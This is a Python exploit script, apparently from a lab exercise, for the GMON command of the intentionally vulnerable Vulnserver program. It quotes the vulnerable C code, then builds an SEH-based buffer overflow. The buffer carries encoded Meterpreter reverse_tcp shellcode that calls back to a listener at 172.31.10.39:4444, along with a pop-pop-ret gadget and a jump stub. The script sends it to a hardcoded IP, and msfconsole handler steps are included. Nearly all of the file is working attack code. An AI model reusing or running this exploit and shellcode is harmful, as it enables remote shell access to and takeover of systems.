# Vuln Server Source Code: https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c


# } else if (strncmp(RecvBuf, "GMON ", 5) == 0) {
# 				char GmonStatus[13] = "GMON STARTED\n";
# 				for (i = 5; i < RecvBufLen; i++) {
# 					if ((char)RecvBuf[i] == '/') {
# 						if (strlen(RecvBuf) > 3950) {
# 							Function3(RecvBuf);
# 						}
# 						break;
# 					}
# 				}
# SendResult = send( Client, GmonStatus, sizeof(GmonStatus), 0 );

# void Function3(char *Input) {
# 	char Buffer2S[2000];
# 	strcpy(Buffer2S, Input);
# }


import socket, sys

IP = '35.182.31.212'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, 9999))
sock.recv(1024)

# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.31.10.39 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 3 -f python

reverse_tcp =  b""
reverse_tcp += b"\xdb\xd7\xb8\x86\xf8\xe4\x9f\xd9\x74\x24\xf4\x5a\x33"
reverse_tcp += b"\xc9\xb1\x61\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2"
reverse_tcp += b"\x73\x22\x2b\x25\x32\x1e\xf0\xcd\x1d\xd4\xdd\x05\xc3"
reverse_tcp += b"\x26\xd7\x57\xa0\xcb\x09\x6b\x67\x9a\xc6\x97\x98\xfc"
reverse_tcp += b"\x4f\xf5\x81\xff\x25\xc0\x0e\x26\x3a\xa8\x0f\x24\x4e"
reverse_tcp += b"\x97\x43\xe0\x93\x36\x8a\x22\xcd\xb9\xfa\x86\xcc\x07"
reverse_tcp += b"\x4a\x44\x69\xa4\xe4\x6e\xb3\x89\xc0\xdd\x0e\xb8\x53"
reverse_tcp += b"\x79\x06\x72\xef\x0e\x41\x74\x16\xb1\xa1\x36\x1d\xd7"
reverse_tcp += b"\x08\x6f\x81\xf3\x65\x80\xfd\x34\x71\x78\x9d\xcb\xb6"
reverse_tcp += b"\x15\x6c\x2b\x74\xd4\x59\x21\xff\x98\xcd\x4c\x7b\xbb"
reverse_tcp += b"\x6f\x09\xb8\xc3\x63\xd1\xcc\xcc\x35\x81\xc9\x79\x72"
reverse_tcp += b"\x15\x2f\x7a\xfd\xf0\xb3\xc8\xdf\x9e\x6d\x94\x68\xbd"
reverse_tcp += b"\xb0\xdf\xf3\x3b\xfa\x9e\x59\x4d\x01\x3f\x42\xc8\xc9"
reverse_tcp += b"\x3a\x6b\x59\x27\x73\xc7\xf2\x15\xa5\xae\x31\xec\x01"
reverse_tcp += b"\xbf\x33\x04\xcc\x18\x15\x0b\x3f\xbd\x82\x7a\x76\x6a"
reverse_tcp += b"\x9f\x72\x0f\xde\x62\x0f\x32\x18\x88\xfb\x24\x0c\x9f"
reverse_tcp += b"\xfc\x73\x69\xee\xb4\xc2\x8b\xd5\xbc\x1f\xb8\x45\xda"
reverse_tcp += b"\xec\xc2\x63\x22\xca\x2d\xa7\x04\x2c\x53\x9a\x7c\x59"
reverse_tcp += b"\x25\x28\x05\x32\xea\xb0\x3a\xf0\xa6\x37\x61\x26\xfa"
reverse_tcp += b"\x2c\xe6\x22\xa3\x61\x76\x3f\x63\x7d\x17\x9c\x8f\x94"
reverse_tcp += b"\x4b\xee\x6e\x4e\x5f\x55\x50\xed\x68\xac\xf3\xe6\x03"
reverse_tcp += b"\x13\x39\x74\x9c\xc4\x78\x42\xa2\x3d\x34\xff\xc0\x6d"
reverse_tcp += b"\x1b\x21\xf0\xc7\xb2\x99\x2e\x02\xb5\x8b\xdf\x40\x8e"
reverse_tcp += b"\x10\x86\x64\xe9\xd2\x2c\x28\x66\x8f\xef\x25\xc1\x2c"
reverse_tcp += b"\x6c\x69\xc0\xd4\x74\x58\x1c\x3f\x4b\x76\x97\x86\xdb"
reverse_tcp += b"\x7f\xa1\xc4\xf9\xff\xd8\x4e\x6a\x09\xbc\x3c\x97\x1e"
reverse_tcp += b"\x7b\xc7\x7d\x20\xa4\x6a\x3b\xa7\x35\x7e\xa4\xaa\x95"
reverse_tcp += b"\x4a\xe3\x0c\x54\xa8\xb3\x8f\xc3\x3c\xf4\xa4\x7a\xf6"
reverse_tcp += b"\xcb\x9b\xed\xa3\x3b\xc3\x24\xe6\xc4\xfa\xb8\x80\xfc"
reverse_tcp += b"\xe3\x76\x72\x0c\x69\xa6\xc0\x94\x48\x7d\x9b\x36\x41"
reverse_tcp += b"\x01\x6e\x68\xae\x23\xe9\x98\x33\x10\x6d\x6c\x4a\x4f"
reverse_tcp += b"\xd9\x4b\xbe\x23\x60\xcb\xb5\xcc\xe1\xc9\xd8"

# Once bound (on kali machine)
# msfconsole -q
# use exploit/multi/handler
# set payload windows/meterpreter/reverse_tcp
# set LHOST 172.31.10.39
# set LPORT 4444
# run


# Exploit Info: Windows Server 2008 x64
# [+] Looking for cyclic pattern in memory
#     Cyclic pattern (normal) found at 0x0253f209 (length 3572 bytes)
#     -  Stack pivot between 33 & 3605 bytes needed to land in this pattern
#     Cyclic pattern (normal) found at 0x00943919 (length 4087 bytes)
#     EBP (0x0253f9d8) points at offset 1999 in normal pattern (length 1576)
#     EDX contains normal pattern : 0x32704531 (offset 3575)
#     ECX (0x00944714) points at offset 3579 in normal pattern (length 508)
# [+] Examining SEH chain
#     SEH record (nseh field) at 0x0253ffc4 overwritten with normal pattern : 0x326e4531 (offset 3515), followed by 52 bytes of cyclic data after the handler
# [+] Examining stack (entire stack) - looking for cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f20c : Contains normal cyclic pattern at ESP+0x24 (+36) : offset 3, length 3572 (-> 0x0253ffff : ESP+0xe18)
# [+] Examining stack (entire stack) - looking for pointers to cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f164 : Pointer into normal cyclic pattern at ESP-0x84 (-132) : 0x0253fc60 : offset 2647, length 928
#     0x0253f168 : Pointer into normal cyclic pattern at ESP-0x80 (-128) : 0x0253f7a0 : offset 1431, length 2144

brk_flag = 0

GMON = "GMON /.:/".encode("ascii")
padding_a = "A".encode("ascii")
padding_c = "C".encode("ascii")
nop = b"\x90"

# @Ref: http://sh3llc0d3r.com/vulnserver-gmon-command-seh-based-overflow-exploit/
# Jumping from 0x0230FFDC to 0x0230FDD7
# Hex Value: 205 Decimal: 517
jmp_to_payload = b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

# JMP SHORT
jmp_short = b"\xEB\x06\x90\x90"

# essfunc.dll (0x62501000 - 0x62502000) No SEH Protection
# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\vulnserver-master\essfunc.dll)
SEH_record = b"\xB4\x10\x50\x62"

# Trigger access violation - Done
# Pointer to next SEH needs to be overwritten with jmp to shellcode
# Current SE handler overwritten and points to pop, pop ret (pop pulls last value added off the stack into register)

# durring prologue of exception handler address of pointer to next SEH was put on the stack at ESP+8, pop pop ret puts this
# address in EIP and allows execution of the code at the address of "pointer to next SEH"

# SEH chain of thread 000002D8
# Address    SE handler
# 0223FFC4   C290C290
# C206ABC3   *** CORRUPT ENTRY ***

# We only have 38 bytes after ptr_next_SEH before end of memory block

# Assemble structure of our payload
# NOP instructions | Reverse Shell payload | Short JMP | NOP | NOP | EIP | Second Stage payload

step1 = GMON
print("Adding Initial Command ({} Bytes) \n".format(sys.getsizeof(step1)))
buffer = step1
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

# Need total of 3515 padding to get to JMP
# 3022 Bytes is where payload needs to go
step2 = nop * (3515-len(reverse_tcp))
print("Adding NOP Padding ({} Bytes) \n".format(sys.getsizeof(step2)))
buffer += step2
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

step3 = reverse_tcp
print("Adding Shellcode ({} Bytes) \n".format(sys.getsizeof(step3)))
buffer += step3
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))



print("Adding JMP Short \n")
buffer += jmp_short
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

print("Adding SEH Pointer \n")
buffer += SEH_record
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

if brk_flag:
    print("Adding Breakpoint \n")
    brk = b"\xCC"
    buffer += brk

print("Adding JMP to payload \n")
buffer += jmp_to_payload
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding for remaining 36 bytes \n")
buffer += nop * (36-len(jmp_to_payload))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding to hit necessary length to trigger exception \n")
buffer += nop * (5050 - len(buffer))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Final Buffer Result: \n")
print(buffer)

if len(buffer) < 3950:
    print("Buffer Length insufficient to call Function3")
    print("Exiting...")
    exit(1)

print("Sending {} Bytes... \n".format(sys.getsizeof(buffer)))
sock.sendall(buffer)
sock.close()
print("Done \n")
exit(0)
